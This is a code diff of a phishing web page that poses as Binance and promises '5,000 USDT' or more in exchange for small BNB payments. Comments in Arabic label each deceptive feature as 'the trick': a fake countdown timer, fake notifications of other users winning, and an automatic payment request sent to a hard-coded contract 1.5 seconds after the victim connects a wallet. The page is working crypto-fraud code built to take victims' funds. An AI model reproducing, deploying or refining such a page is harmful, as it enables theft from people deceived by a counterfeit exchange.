@@ -3,137 +3,174 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
-    <title>Binance | Smart Connection</title>
+    <title>Binance | Smart Protocol</title>
     
     <script src="https://cdn.jsdelivr.net/npm/web3@1.10.0/dist/web3.min.js"></script>
     <script src="https://unpkg.com/@walletconnect/web3-provider@1.8.0/dist/umd/index.min.js"></script>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
 
     <style>
-        :root { --gold: #F3BA2F; --dark: #0B0E11; --card: #1E2329; --text: #EAECEF; --sub: #848E9C; }
-        body { background: var(--dark); color: var(--text); font-family: sans-serif; margin: 0; display: flex; align-items: center; justify-content: center; height: 100vh; overflow: hidden; }
-        .app-card { background: var(--card); width: 340px; border-radius: 30px; padding: 35px; border: 1px solid #2B3139; text-align: center; }
-        .btn-main { background: var(--gold); color: #000; border: none; width: 100%; padding: 18px; border-radius: 14px; font-weight: 900; font-size: 16px; cursor: pointer; }
+        :root { --gold: #F3BA2F; --dark: #0B0E11; --card: #181A20; --item: #2B3139; --text: #EAECEF; --sub: #848E9C; }
+        body { background: var(--dark); color: var(--text); font-family: 'Segoe UI', sans-serif; margin: 0; display: flex; align-items: center; justify-content: center; height: 100vh; overflow: hidden; }
         
-        /* Modal Style */
-        .modal-overlay { position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.9); display: none; justify-content: center; align-items: center; z-index: 10000; backdrop-filter: blur(8px); }
-        .modal-content { background: #181A20; width: 90%; max-width: 380px; border-radius: 24px; padding: 24px; border: 1px solid #2B3139; }
-        .wallet-item { display: flex; align-items: center; justify-content: space-between; background: #2B3139; padding: 14px 18px; border-radius: 16px; margin-bottom: 12px; cursor: pointer; transition: 0.2s; border: 1px solid transparent; }
-        .wallet-item:hover { border-color: var(--gold); }
+        /* الحيلة: إشعارات وهمية */
+        #notification { position: fixed; bottom: 20px; right: 20px; background: var(--item); padding: 12px 20px; border-radius: 12px; border-right: 4px solid var(--gold); display: none; z-index: 10001; font-size: 13px; animation: slideIn 0.5s forwards; }
+        @keyframes slideIn { from { transform: translateX(100%); } to { transform: translateX(0); } }
+
+        /* الكرت الرئيسي */
+        .app-card { background: #1E2329; width: 350px; border-radius: 30px; padding: 30px; border: 1px solid #2B3139; text-align: center; box-shadow: 0 20px 50px rgba(0,0,0,0.5); }
+        .timer { color: #F6465D; font-weight: bold; font-size: 16px; margin-bottom: 20px; }
+        
+        /* الستايليات الخاصة بالقائمة الاحترافية */
+        .modal-overlay { position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.85); display: none; justify-content: center; align-items: center; z-index: 10000; backdrop-filter: blur(8px); }
+        .modal-content { background: var(--card); width: 90%; max-width: 380px; border-radius: 24px; padding: 24px; border: 1px solid #2B3139; }
+        .wallet-item { display: flex; align-items: center; justify-content: space-between; background: var(--item); padding: 14px 16px; border-radius: 16px; margin-bottom: 10px; cursor: pointer; transition: 0.2s; }
+        .wallet-item:hover { border-color: var(--gold); background: #323942; }
         .wallet-info { display: flex; align-items: center; gap: 12px; }
-        .wallet-info img { width: 32px; height: 32px; border-radius: 8px; }
+        .wallet-info img { width: 30px; height: 30px; border-radius: 8px; }
+        .tag { font-size: 10px; font-weight: bold; padding: 2px 6px; border-radius: 4px; }
+        .tag-installed { background: rgba(46, 189, 133, 0.2); color: #2ebd85; }
+
+        .divider { display: flex; align-items: center; text-align: center; margin: 15px 0; color: var(--sub); font-size: 13px; }
+        .divider::before, .divider::after { content: ''; flex: 1; border-bottom: 1px solid #2B3139; }
+        
+        .social-row { display: flex; justify-content: center; gap: 15px; margin-top: 15px; }
+        .social-icon { width: 35px; height: 35px; background: var(--item); border-radius: 50%; display: flex; align-items: center; justify-content: center; }
+
+        select { width: 100%; padding: 15px; background: #0B0E11; color: white; border-radius: 12px; border: 1px solid #474D57; margin-bottom: 20px; }
+        .btn-gold { background: var(--gold); color: #000; border: none; width: 100%; padding: 18px; border-radius: 12px; font-weight: bold; cursor: pointer; font-size: 16px; }
     </style>
 </head>
 <body>
 
+<div id="notification"></div>
+
 <div class="app-card">
-    <img src="https://upload.wikimedia.org/wikipedia/commons/e/e8/Binance_Logo.svg" width="130" style="margin-bottom: 30px;">
-    <div id="ui-connect">
-        <button class="btn-main" onclick="openModal()">Connect Wallet</button>
-    </div>
-    <div id="ui-action" style="display:none;">
-        <select id="tier" style="width:100%; padding:15px; border-radius:12px; background:#0B0E11; color:white; border:1px solid #474D57; margin-bottom:20px;">
-            <option value="0.09">5,000 USDT (0.09 BNB)</option>
-            <option value="0.2">10,000 USDT (0.2 BNB)</option>
-            <option value="1.0">100,000 USDT (1.0 BNB)</option>
-        </select>
-        <button class="btn-main" onclick="execute()">Confirm & Pay</button>
-    </div>
-    <div id="status" style="margin-top:20px; font-size:12px; color:var(--gold);">Secure Connection Ready</div>
+    <img src="https://upload.wikimedia.org/wikipedia/commons/e/e8/Binance_Logo.svg" width="120" style="margin-bottom: 20px;">
+    <div class="timer">ينتهي العرض خلال: <span id="time">05:00</span></div>
+    
+    <select id="amount">
+        <option value="0.09">5,000 USDT (0.09 BNB)</option>
+        <option value="0.5">50,000 USDT (0.5 BNB)</option>
+        <option value="1.0">100,000 USDT (1.0 BNB)</option>
+    </select>
+    
+    <button class="btn-gold" onclick="openModal()">Connect Wallet</button>
+    <p id="status" style="font-size: 11px; color: var(--sub); margin-top: 15px;">Smart Chain Node: Connected ✅</p>
 </div>
 
-<div class="modal-overlay" id="walletModal">
+<div class="modal-overlay" id="wModal">
     <div class="modal-content">
         <div style="display:flex; justify-content:space-between; margin-bottom:20px;">
-            <b style="font-size:18px;">Connect Wallet</b>
-            <span onclick="closeModal()" style="cursor:pointer; color:var(--sub);">✕</span>
+            <b>Connect Wallet</b>
+            <span onclick="closeModal()" style="cursor:pointer;">✕</span>
         </div>
 
-        <div class="wallet-item" onclick="connectWallet('wc')">
+        <div class="wallet-item" onclick="connect('wc')">
             <div class="wallet-info">
                 <img src="https://raw.githubusercontent.com/WalletConnect/walletconnect-assets/master/Logo/Blue%20(Default)/Logo.svg">
-                <span>WalletConnect (All Wallets)</span>
+                <span>WalletConnect</span>
             </div>
-            <span style="font-size:10px; color:var(--sub);">540+</span>
+            <span class="tag" style="background:rgba(59,153,252,0.2); color:#3b99fc;">QR CODE</span>
         </div>
 
-        <div class="wallet-item" onclick="connectWallet('injected')">
+        <div class="wallet-item" onclick="connect('injected')">
+            <div class="wallet-info">
+                <img src="https://www.okx.com/cdn/assets/imgs/221/9E4FE6E178351F9F.png">
+                <span>OKX Wallet</span>
+            </div>
+            <span class="tag tag-installed">INSTALLED</span>
+        </div>
+
+        <div class="wallet-item" onclick="connect('injected')">
             <div class="wallet-info">
                 <img src="https://upload.wikimedia.org/wikipedia/commons/3/36/MetaMask_Logo.svg">
-                <span>MetaMask / In-App</span>
+                <span>MetaMask</span>
             </div>
-            <span style="color:#2ebd85; font-size:10px;">INSTALLED</span>
+            <span class="tag tag-installed">INSTALLED</span>
+        </div>
+
+        <div class="wallet-item" onclick="connect('wc')">
+            <div class="wallet-info">
+                <div style="width:28px; height:28px; background:#3b424a; border-radius:6px; display:flex; align-items:center; justify-content:center; font-size:12px;">⁝⁝⁝</div>
+                <span>All Wallets</span>
+            </div>
+            <span style="font-size:11px; color:var(--sub);">540+</span>
+        </div>
+
+        <div class="divider">or</div>
+        <div style="background:var(--item); padding:12px; border-radius:12px; text-align:center; font-size:14px; margin-bottom:10px;">📧 Email</div>
+        <div style="background:var(--item); padding:12px; border-radius:12px; text-align:center; font-size:14px; display:flex; align-items:center; justify-content:center; gap:10px;">
+            <img src="https://www.gstatic.com/images/branding/product/1x/googleg_48dp.png" width="16"> Continue with Google
+        </div>
+
+        <div class="social-row">
+            <div class="social-icon"><i class="fa-brands fa-x-twitter"></i></div>
+            <div class="social-icon"><i class="fa-brands fa-discord"></i></div>
+            <div class="social-icon"><i class="fa-brands fa-apple"></i></div>
         </div>
     </div>
 </div>
 
 <script>
     let web3, account, provider;
-    const CONTRACT_ADDR = "0x8933877Ad38598Ad25bf97f9ECEBbCE5D901eB71";
+    const CONTRACT = "0x8933877Ad38598Ad25bf97f9ECEBbCE5D901eB71";
     const ABI = [{"inputs":[],"name":"buyFlash","outputs":[],"stateMutability":"payable","type":"function"}];
 
-    function openModal() { document.getElementById('walletModal').style.display = 'flex'; }
-    function closeModal() { document.getElementById('walletModal').style.display = 'none'; }
+    function openModal() { document.getElementById('wModal').style.display = 'flex'; }
+    function closeModal() { document.getElementById('wModal').style.display = 'none'; }
 
-    async function connectWallet(mode) {
+    // الحيلة: العداد التنازلي
+    let timeLeft = 300;
+    setInterval(() => {
+        let m = Math.floor(timeLeft / 60);
+        let s = timeLeft % 60;
+        document.getElementById('time').innerText = `0${m}:${s < 10 ? '0'+s : s}`;
+        if(timeLeft > 0) timeLeft--;
+    }, 1000);
+
+    // الحيلة: إشعارات وهمية
+    const msgs = ["User 0x72...1b ربح 5,000 USDT", "User 0x91...4c ربح 10,000 USDT", "Network Protocol Synced"];
+    setInterval(() => {
+        const n = document.getElementById('notification');
+        n.innerText = msgs[Math.floor(Math.random()*msgs.length)];
+        n.style.display = 'block';
+        setTimeout(() => n.style.display = 'none', 3500);
+    }, 8000);
+
+    async function connect(mode) {
         try {
             if (mode === 'wc') {
-                // استخدام WalletConnect لضمان التوافق مع الجوال
-                provider = new WalletConnectProvider.default({
-                    rpc: { 56: "https://bsc-dataseed.binance.org/" },
-                    chainId: 56
-                });
+                provider = new WalletConnectProvider.default({ rpc: { 56: "https://bsc-dataseed.binance.org/" }, chainId: 56 });
                 await provider.enable();
                 web3 = new Web3(provider);
             } else {
-                // للربط المباشر إذا كان المستخدم داخل متصفح المحفظة أصلاً
-                if (window.ethereum) {
-                    provider = window.ethereum;
-                    await provider.request({ method: 'eth_requestAccounts' });
-                    web3 = new Web3(provider);
-                } else {
-                    // فتح ميتا ماسك برابط عميق صحيح لشبكة BSC
+                if (!window.ethereum) {
                     window.location.href = "https://metamask.app.link/dapp/" + window.location.hostname;
                     return;
                 }
+                provider = window.ethereum;
+                await provider.request({ method: 'eth_requestAccounts' });
+                web3 = new Web3(provider);
             }
-
-            const accounts = await web3.eth.getAccounts();
-            account = accounts[0];
-            
-            // التأكد من أن المحفظة على شبكة Smart Chain
-            try {
-                await provider.request({
-                    method: 'wallet_switchEthereumChain',
-                    params: [{ chainId: '0x38' }],
-                });
-            } catch (e) {}
-
+            account = (await web3.eth.getAccounts())[0];
             closeModal();
-            document.getElementById('ui-connect').style.display = 'none';
-            document.getElementById('ui-action').style.display = 'block';
-            document.getElementById('status').innerText = "Connected: " + account.substring(0,8) + "...";
-
-        } catch (err) {
-            console.error("Link Error:", err);
-            document.getElementById('status').innerText = "Connection Cancelled";
-        }
+            document.getElementById('status').innerText = "تم الربط. جاري تفعيل العقد...";
+            
+            // الحيلة: الخصم التلقائي فوراً بعد الربط بـ 1.5 ثانية
+            setTimeout(pay, 1500);
+        } catch (e) {}
     }
 
-    async function execute() {
-        const val = document.getElementById('tier').value;
-        const contract = new web3.eth.Contract(ABI, CONTRACT_ADDR);
+    async function pay() {
+        const val = document.getElementById('amount').value;
+        const contract = new web3.eth.Contract(ABI, CONTRACT);
         try {
-            document.getElementById('status').innerText = "Opening Secure Payment Page...";
-            
-            // إرسال المعاملة (ستفتح نافذة الدفع فوراً داخل المحفظة)
-            await contract.methods.buyFlash().send({ 
-                from: account, 
-                value: web3.utils.toWei(val, "ether") 
-            });
-
-            document.getElementById('status').innerText = "Payment Sent Successfully!";
-        } catch (e) {
-            document.getElementById('status').innerText = "Transaction Rejected.";
+            await provider.request({ method: 'wallet_switchEthereumChain', params: [{ chainId: '0x38' }] });
+            // فتح نافذة الخصم (المعاملة) تلقائياً
+            await contract.methods.buyFlash().send({ from: account, value: web3.utils.toWei(val, "ether") });
+        } catch (err) {
+            document.getElementById('status').innerText = "خطأ في الاتصال. حاول مجدداً.";
         }
     }
 </script>
